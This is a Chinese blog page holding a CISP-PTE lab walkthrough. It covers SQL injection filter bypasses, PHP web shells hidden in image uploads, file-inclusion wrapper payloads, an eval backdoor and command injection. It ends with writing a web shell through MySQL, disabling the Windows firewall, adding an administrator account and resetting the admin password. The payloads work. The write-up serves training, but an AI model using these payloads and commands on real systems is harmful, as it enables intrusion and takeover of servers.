@@ -1,0 +1,952 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+       
+      <meta name="keywords" content="生活，思考 ，渗透，审计，代码。。。" />
+       
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title> 小透的少年江湖</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/haoyun.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-Cisp-pte靶场练习"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+     
+    <div class="article-meta">
+      <a href="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" class="article-date">
+  <time datetime="2022-06-26T04:59:36.038Z" itemprop="datePublished">2022-06-26</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">1.9k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">7 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="cisp-pte靶场练习"><a href="#cisp-pte靶场练习" class="headerlink" title="cisp-pte靶场练习"></a>cisp-pte靶场练习</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626194244620.png" class title="image-20220626194244620">
+
+
+
+<p>首先我们先对查询字段数进行判断，使用order by进行查看，可发现将空格和#字符进行了过滤。</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626194357072.png" class title="image-20220626194357072">
+
+
+
+<p>将空格和#使用其他进行代替尝试绕过。使用 &#x2F;**&#x2F;  或者    &#x2F;*!*&#x2F;代替空格，%23代替#号.当字段大于4时查询失败，判读查询字段为4</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626200144818.png" class title="image-20220626200144818">
+
+
+
+<p>这里也过滤了union，使用双写大小写来绕过。接着判断回显字段、</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;)/*!*/uniunionon/*!*/select/*!*/1,2,3,4%23</span><br></pre></td></tr></table></figure>
+
+<p>回显字段为2.3.4，所以对这三个字段输入查询语句</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626200653950.png" class title="image-20220626200653950">
+
+
+
+<p>这里可以通过几种方法获取key值，使用load_file()函数读取文件，写一句话木马到Web路径下，获取数据库账号密码信息等</p>
+<p>首先我们使用load_file()函数来读取文件，前提是该数据库设置属性允许读写文件，获取key值为key{8b3h4a7v }。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;)/*!*/uniunionon/*!*/select/*!*/1,database(),version(),load_file(&#x27;/tmp/360/key&#x27;)#</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626201650989.png" class title="image-20220626201650989">
+
+
+
+<p>接下来我们在写一句话木马，可发现语句被过滤啦</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626202454053.png" class title="image-20220626202454053">
+
+
+
+<p>最后我们可通过information_schema数据表中tables、columns表来逐个获取账号密码信息，通过登录mysql数据库写入一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;)/*!*/uniunionon/*!*/select/*!*/1,(select/*!*/group_concat(table_name)/*!*/from/**/information_schema.tables/**/where/**/table_schema=&#x27;2web&#x27;),database(),(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;article&#x27;)%23</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626203634439.png" class title="image-20220626203634439">
+
+<p>可发现数据库并无账号密码信息</p>
+<p><strong>SQLMAP工具使用</strong></p>
+<p>判断注入点为id并且数据库为Mysql</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://192.168.58.128:81/vulnerabilities/fu1.php?id=1&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626205159051.png" class title="image-20220626205159051">
+
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://192.168.58.128:81/vulnerabilities/fu1.php?id=1&quot; --file-read=/tmp/360/key --tamper &quot;space2hash.py&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626204852197.png" class title="image-20220626204852197">
+
+
+
+<p>访问指定文件获取key值</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626205709776.png" class title="image-20220626205709776">
+
+
+
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h2 id="日志分析-暴力破解"><a href="#日志分析-暴力破解" class="headerlink" title="日志分析+暴力破解"></a>日志分析+暴力破解</h2><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626125937213.png" class title="image-20220626125937213">
+
+<p>首先将一句话<?php eval($_GET['a'])?>上传后文件不存在，将函数修改为asset等函数和修改后缀拓展名为php3、php5等不常用后缀都未上传成功，判断服务器对上传文件进行了头部检测和常用危险函数(eval、asset)过滤。</p>
+<p>尝试上传图片文件，显示上传文件有效并且返回上传图片路径</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626130620141.png" class title="image-20220626130620141">
+
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626130704030.png" class title="image-20220626130704030">
+
+
+
+<p>所以我们可以上传图片马和添加图片头文件GIF89a来绕过。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> readfile(<span class="string">&#x27;../key.php&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#&lt;?php highlight_file(&#x27;../key.php&#x27;)&gt;</span></span><br><span class="line"><span class="comment">#&lt;?php echo file_get_contents(&#x27;../key.php&#x27;);?&gt;</span></span><br><span class="line"><span class="comment">#&lt;?php system($_REQUEST[&#x27;a&#x27;]);?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>通过burp拦截请求包并修改mime类型为image&#x2F;jpg，这里还需对上传文件后缀名称修改为php3或php5等非php后缀才可上传成功。</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626131322456.png" class title="image-20220626131322456">
+
+
+
+<p>在浏览器中访问上传文件test.php3</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626131412994.png" class title="image-20220626131412994">
+
+
+
+<p>查看页面源代码得到key值，为key{8t5s0x5t}</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626131459715.png" class title="image-20220626131459715">
+
+
+
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626132052310.png" class title="image-20220626132052310">
+
+
+
+<p>可以看到URL地址中参数file为view.html，尝试修改参数为系统文件&#x2F;etc&#x2F;passwd文件，读取成功，存在本地文件读取。</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626132306870.png" class title="image-20220626132306870">
+
+
+
+<p>尝试读取key.php文件，失败</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626132434791.png" class title="image-20220626132434791">
+
+
+
+<p>尝试远程文件包含，将file参数修改为远程服务器上文件，如文件上传中的test.php3文件，读取成功但未显示key值</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626132729807.png" class title="image-20220626132729807">
+
+
+
+<p>尝试php伪协议读取文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hackbar:file=php:<span class="comment">//input</span></span><br><span class="line">post data:</span><br><span class="line"><span class="meta">&lt;?php</span> highlight_file(<span class="string">&#x27;../key.php&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#&lt;?php echo file_get_contents(&#x27;../key.php&#x27;);?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如下读取成功,key值为key{6u3x9t2p}</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626134712008.png" class title="image-20220626134712008">
+
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626134811730.png" class title="image-20220626134811730">
+
+
+
+<p>尝试base64编码读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/convert.base64-encode/resource=../key.php</span><br></pre></td></tr></table></figure>
+
+<p>读取成功，key值key{R2V0IGl0IQ0KPD9waHANCg0KLy9rZXk6NnUzeDl0MnANCj8+ }</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626135248118.png" class title="image-20220626135248118">
+
+<h2 id="文件包含-1"><a href="#文件包含-1" class="headerlink" title="文件包含+"></a>文件包含+</h2><img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626135530005.png" class title="image-20220626135530005">
+
+
+
+<p>这道题和前面的文件包含不一样，没有参数传递，我们查看页面源代码，对POST请求中参数进行正则匹配代替为如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">@$a = $_POST[&#x27;Hello&#x27;]; </span><br><span class="line">if(isset($a))&#123; </span><br><span class="line">@preg_replace(&quot;/\[(.*)\]/e&quot;,&#x27;\\1&#x27;,base64_decode(&#x27;W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=&#x27;)); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626135831208.png" class title="image-20220626135831208">
+
+<p>其中Base64编码解码为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[@eval(base64_decode($_POST[z0]));]</span><br></pre></td></tr></table></figure>
+
+
+
+<p>所以需要将a进行赋值和对z0进行Base64编码后进行传参</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello=aaa&amp;z0=c3lzdGVtKCdjYXQgLi4va2V5LnBocCcpOw==</span><br><span class="line">#zo参数为system(&#x27;cat ../key.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626141220758.png" class title="image-20220626141220758">
+
+
+
+<p>查看源代码获取key值，key{6u3x9t2p}</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626143129377.png" class title="image-20220626143129377">
+
+
+
+<h2 id="文件包含-2"><a href="#文件包含-2" class="headerlink" title="文件包含++"></a>文件包含++</h2><img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626144511329.png" class title="image-20220626144511329">
+
+
+
+<p>查看其源代码。可发现一段PHP代码，这段代码的意思是对请求参数cmd进行判断存在并且计算其长度，满足后方可执行exec函数执行命令，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (isset($_GET[&#x27;cmd&#x27;]) &amp;&amp; strlen($_GET[&#x27;cmd&#x27;]) &lt;=30)</span><br><span class="line">&#123; @exec($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626144726561.png" class title="image-20220626144726561">
+
+
+
+<p>构造payload来寻找key.php文件位置在上一级目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cmd=ls ../&gt;b.txt</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626151956672.png" class title="image-20220626151956672">
+
+
+
+<p>构造payload来读取key.php文件获取key值,key{6u3x9t2p}</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cmd=cat ../key.php&gt;a.txt</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626152131866.png" class title="image-20220626152131866">
+
+
+
+<h2 id="综合环境"><a href="#综合环境" class="headerlink" title="综合环境"></a>综合环境</h2><p>访问靶场Web环境，首先弹出个认证弹窗，可拦截登录请求对认证字段进行爆破</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626153704424.png" class title="image-20220626153704424">
+
+
+
+<p>使用burp拦截选取Authorization字段使用intruder中迭代器选取字典，并对其进行Base64加密爆破，如下</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626153934729.png" class title="image-20220626153934729">
+
+<p>Base64解码后得admin:123456</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626154019009.png" class title="image-20220626154019009">
+
+
+
+<p>登陆成功，为一个DedeCms网站，由于网站页面设置了验证码不可长时间爆破，所以对其进行Web扫描。</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626154130196.png" class title="image-20220626154130196">
+
+
+
+<p>发现两个重定向目录，&#x2F;dede&#x2F;和&#x2F;phpmyadmin&#x2F;</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626154618410.png" class title="image-20220626154618410">
+
+
+
+<p>访问&#x2F;dede&#x2F;后台，尝试弱口令或者爆破账号密码</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626154738303.png" class title="image-20220626154738303">
+
+
+
+<p>使用弱口令admin&#x2F;888888登录成功，可通过多种方法对织梦管理系统写马获取权限</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626154858979.png" class title="image-20220626154858979">
+
+
+
+<p>下面访问phpadmin数据库管理后台，使用弱口令root&#x2F;root登录</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626155536820.png" class title="image-20220626155536820">
+
+
+
+<p>前面我们通过弱口令进入了织梦后台管理系统，若管理员设置了强密码我们需从其他地方获取或者修改账号密码进行后台登陆。此时我们进入Phpmyadmin后，寻找存储Dedecms管理员账号密码的数据表信息。</p>
+<p>查询到Dedecms的管理员账号以及密码MD5值</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626161401183.png" class title="image-20220626161401183">
+
+
+
+<p>对密码MD5爆破解密为888888</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626161528581.png" class title="image-20220626161528581">
+
+
+
+<p>由于该密码过于简单，若管理员设置了强密码，短时间内可能爆破不出来密码，只可自己生成密码MD5值对其进行修改。</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626162001475.png" class title="image-20220626162001475">
+
+
+
+<p>修改成功，后台账号密码为admin&#x2F;123456</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626162050745.png" class title="image-20220626162050745">
+
+
+
+<p>接下来我们就利用SQL语句来写木马文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php @eval($_GET[&#x27;cmd&#x27;]);?&gt;&quot; into outfile &#x27;c:/phpstudy/www/shell.php&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>文件写入成功</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626162419358.png" class title="image-20220626162419358">
+
+
+
+<p>我们在浏览器中测试一下，命令执行成功</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626174536870.png" class title="image-20220626174536870">
+
+
+
+<p>我们利用菜刀或者蚁剑来访问该文件获取服务器权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://admin:123456@192.168.58.129/hyq.php</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626173038043.png" class title="image-20220626173038043">
+
+
+
+<p>获取根目录下key文件，key2值为key{u8i9o0p6}</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626173106125.png" class title="image-20220626173106125">
+
+
+
+<p>接下来我们需要连接远程桌面获取回收站中的key值</p>
+<p>首先判断目标主机是否开放3389端口，只开放80端口</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626174444489.png" class title="image-20220626174444489">
+
+
+
+<p>所以我们需要手工开启目标主机3389端口，在这之前需要关闭防火墙</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">win2003:</span><br><span class="line">netsh firewall set opmode disable</span><br><span class="line"></span><br><span class="line">win2008:</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626191249365.png" class title="image-20220626191248011">
+
+
+
+<p>随后将3389.bat上传至目标主机上</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626191508609.png" class title="image-20220626191508609">
+
+
+
+<p>在虚拟终端中执行3389.bat文件开启3389端口服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3389.bat</span><br></pre></td></tr></table></figure>
+
+<p>目标主机3389端口开启</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626191817297.png" class title="image-20220626191817297">
+
+
+
+<p>使用远程桌面需要输入管理员账号密码，所以尝试创建新用户root加入管理员组</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user root toor12345 /add</span><br><span class="line">net localgroup administrators root /add</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626192043145.png" class title="image-20220626192043145">
+
+
+
+<p>在命令提示符中输入mstsc打开远程连接工具，输入目标主机ip地址和上面新建的用户账号密码，登录成功</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626192353936.png" class title="image-20220626192353936">
+
+
+
+<p>可以看到登录了用户root的远程左面，并无任何应用以及文件，无法获取到key值</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626192541965.png" class title="image-20220626192541965">
+
+
+
+<p>由于key值文件在管理员administrator用户的桌面上，所以需要获取或者修改该用户的密码，这里采用在命令行中直接修改用户administrator的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user administrator admin12345</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626192948891.png" class title="image-20220626192948891">
+
+
+
+<p>然后用administrator用户进行登录远程桌面，从回收站中恢复文件读取key值，key{a2d3f4g5}</p>
+<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626193208174.png" class title="image-20220626193208174">
+
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          打赏
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            (no title)
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2022/05/15/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">模板注入漏洞汇总</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.staticfile.org/valine/1.4.16/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "BAHT50PldtBLrMFvOb5LqqlL-gzGzoHsz",
+    app_key: "tj3HfiFvtJ3pRIhgXGBqdN7b",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021-2022
+        <i class="ri-heart-fill heart_icon"></i> John Doe
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
